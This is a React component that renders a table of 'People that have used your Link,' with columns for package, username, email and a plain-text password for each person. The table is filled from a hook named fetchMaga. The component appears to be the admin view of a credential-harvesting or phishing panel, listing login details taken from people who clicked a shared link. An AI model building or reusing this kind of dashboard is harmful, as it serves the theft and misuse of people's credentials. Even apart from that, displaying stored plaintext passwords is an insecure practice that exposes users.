import { Avatar, AvatarFallback, AvatarImage } from '../../../components/ui/avatar'
import {
  Table,
  TableBody,
  TableCaption,
  TableCell,
  TableHead,
  TableHeader,
  TableRow,
} from "../../../components/ui/table"

import fetchData from '../../../hooks/fetchMaga'


export function Recents() {
  const { data } = fetchData()
  console.log(data?.data)
  return (
    <div className='space-y-8'>
      <Table>
        <TableCaption>People that have used your Link.</TableCaption>
        <TableHeader>
          <TableRow>
            <TableHead>Package</TableHead>
            <TableHead>Name</TableHead>
            <TableHead>Email</TableHead>
            <TableHead className="text-right">Password</TableHead>
          </TableRow>
        </TableHeader>
        <TableBody>
          {data?.data.map((detail)=> (
            <TableRow key={detail.id}>
              <TableCell className="font-medium">
              {detail?.package?.name}
              </TableCell>
              <TableCell>{detail?.username ?? "Null"}</TableCell>
              <TableCell>{detail?.email}</TableCell>
              <TableCell className="text-right">{detail.password}</TableCell>
            </TableRow>
          ))}
        </TableBody>
      </Table>
    </div>
  )
}